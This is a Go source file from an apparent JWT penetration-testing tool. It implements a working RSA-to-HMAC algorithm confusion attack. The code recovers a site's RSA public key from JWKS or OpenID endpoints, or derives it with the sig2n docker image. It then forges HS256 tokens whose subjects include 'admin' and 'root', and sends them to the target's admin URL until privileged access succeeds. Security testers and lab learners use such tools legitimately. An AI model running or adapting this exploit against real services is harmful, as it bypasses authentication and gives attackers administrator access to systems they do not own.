package jwt

import (
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"os/exec"
	"strings"

	"github.com/spencer5cent/jwtknife/internal/httpx"
	"github.com/spencer5cent/jwtknife/internal/jwtknifejwt"
	"github.com/spencer5cent/jwtknife/internal/report"
)

// AlgConfusionAttack implements RSA → HMAC algorithm confusion attacks.
type AlgConfusionAttack struct{}

type jwks struct {
	Keys []json.RawMessage `json:"keys"`
}

type jwkRSA struct {
	Kty string `json:"kty"`
	N   string `json:"n"`
	E   string `json:"e"`
}

type oidcConfig struct {
	JWKSURI string `json:"jwks_uri"`
}

func fetchURL(u string) ([]byte, int, error) {
	resp, err := http.Get(u)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return b, resp.StatusCode, nil
}

func resolveJWKSURI(baseURL string, jwksURI string) (string, error) {
	base, err := url.Parse(strings.TrimRight(baseURL, "/") + "/")
	if err != nil {
		return "", err
	}
	u, err := url.Parse(strings.TrimSpace(jwksURI))
	if err != nil {
		return "", err
	}
	return base.ResolveReference(u).String(), nil
}

func rsaPublicKeyFromJWKS(body []byte) ([]byte, error) {
	var set jwks
	if err := json.Unmarshal(body, &set); err != nil {
		return nil, err
	}
	if len(set.Keys) == 0 {
		return nil, errors.New("empty JWKS")
	}

	var key jwkRSA
	if err := json.Unmarshal(set.Keys[0], &key); err != nil {
		return nil, err
	}
	if key.Kty != "RSA" {
		return nil, errors.New("non-RSA key in JWKS")
	}

	nb, err := base64.RawURLEncoding.DecodeString(key.N)
	if err != nil {
		return nil, err
	}
	eb, err := base64.RawURLEncoding.DecodeString(key.E)
	if err != nil {
		return nil, err
	}

	n := new(big.Int).SetBytes(nb)
	e := int(new(big.Int).SetBytes(eb).Int64())
	if e == 0 {
		return nil, errors.New("invalid RSA exponent")
	}

	pub := &rsa.PublicKey{N: n, E: e}
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil, err
	}

	return pem.EncodeToMemory(&pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: der,
	}), nil
}

func NewAlgConfusionAttack() Attack {
	return AlgConfusionAttack{}
}

func (AlgConfusionAttack) Name() string {
	return "alg-confusion"
}

func (AlgConfusionAttack) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("alg-confusion")

	if !strings.HasPrefix(strings.ToUpper(in.ParsedJWT.Alg), "RS") {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "original token is not RSA-signed"
		return ar
	}

	// ===== Phase 1: try to obtain public key via JWKS =====
	jwksPaths := []string{
		"/jwks.json",
		"/.well-known/jwks.json",
		"/.well-known/openid-configuration",
	}

	var pubKeyPEM []byte
	base := strings.TrimRight(in.Targets.PublicURL, "/")

	for _, path := range jwksPaths {
		body, status, err := fetchURL(base + path)
		if err != nil || status != 200 {
			continue
		}

		jwksBody := body

		if strings.Contains(path, "openid-configuration") {
			var cfg oidcConfig
			if err := json.Unmarshal(body, &cfg); err != nil || cfg.JWKSURI == "" {
				continue
			}
			jwksURL, err := resolveJWKSURI(base, cfg.JWKSURI)
			if err != nil {
				continue
			}
			b2, s2, err := fetchURL(jwksURL)
			if err != nil || s2 != 200 {
				continue
			}
			jwksBody = b2
		}

		if k, err := rsaPublicKeyFromJWKS(jwksBody); err == nil {
			pubKeyPEM = k
			break
		}
	}

	// ===== Phase 2: no JWKS — sig2n-style scenario =====
	if pubKeyPEM == nil {
		step := report.Step{
			Label:   "alg-confusion-sig2n",
			Details: "No exposed JWKS. Attempting RSA public key derivation using sig2n (docker).",
		}

		ar.Steps = append(ar.Steps, step)

		if strings.TrimSpace(in.SecondRawJWT) == "" {
			ar.Outcome = report.OutcomeInteresting
			ar.Note = "No exposed JWKS. Provide a second server-issued JWT to attempt RSA public key derivation (sig2n)."
			return ar
		}

		cmd := exec.Command(
			"docker", "run", "--rm", "-i",
			"portswigger/sig2n",
			in.RawJWT,
			in.SecondRawJWT,
		)

		out, err := cmd.CombinedOutput()
		if err != nil {
			ar.Outcome = report.OutcomeInteresting
			ar.Note = "sig2n execution failed or docker unavailable"
			ar.Errors = append(ar.Errors, err.Error())
			return ar
		}

		step.Details = "sig2n executed successfully; manual key validation required"
		step.JWT.Token = strings.TrimSpace(string(out))
		ar.Steps = append(ar.Steps, step)

		ar.Outcome = report.OutcomeInteresting
		ar.Note = "RSA modulus candidates derived via sig2n. Validate X.509 key and re-run alg confusion."
		return ar
	}

	// ===== Phase 3: RS → HS confusion using recovered public key =====
	p, err := jwtknifejwt.Parse(in.RawJWT)
	if err != nil {
		ar.Outcome = report.OutcomeError
		ar.Errors = append(ar.Errors, err.Error())
		return ar
	}

	p.Header["alg"] = "HS256"

	subjects := []string{"administrator", "admin", "root", "superuser", "carlos"}

	for _, sub := range subjects {
		p.Payload["sub"] = sub

		rebuilt, err := jwtknifejwt.Rebuild(p)
		if err != nil {
			continue
		}

		parts := strings.SplitN(rebuilt, ".", 3)
		if len(parts) < 2 {
			continue
		}

		unsigned := parts[0] + "." + parts[1]

		variants := [][]byte{
			pubKeyPEM,
			[]byte(base64.StdEncoding.EncodeToString(pubKeyPEM)),
		}

		for _, key := range variants {
			h := hmac.New(sha256.New, key)
			h.Write([]byte(unsigned))
			sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
			forged := unsigned + "." + sig

			step := report.Step{
				Label:   "alg-confusion",
				Details: "RS256 → HS256 using derived RSA public key",
				JWT:     report.JWTInfo{Token: forged},
			}

			if in.Client != nil && in.Targets.AdminURL != "" {
				r := in.Client.Do(httpx.RequestPlan{
					Label:     "alg-confusion-admin",
					URL:       in.Targets.AdminURL,
					Method:    in.Targets.Method,
					JWT:       forged,
					Placement: in.Targets.Placement,
				})
				step.HTTP = report.FromHTTPResult(r)

				if report.IsAdminSuccess(in.Baseline, step.HTTP) {
					ar.Steps = append(ar.Steps, step)
					ar.Outcome = report.OutcomeSuccess
					ar.Note = "admin access via RSA→HMAC algorithm confusion"
					return ar
				}
			}

			ar.Steps = append(ar.Steps, step)
		}
	}

	if ar.Outcome == "" {
		ar.Outcome = report.OutcomeNoEffect
	}
	return ar
}
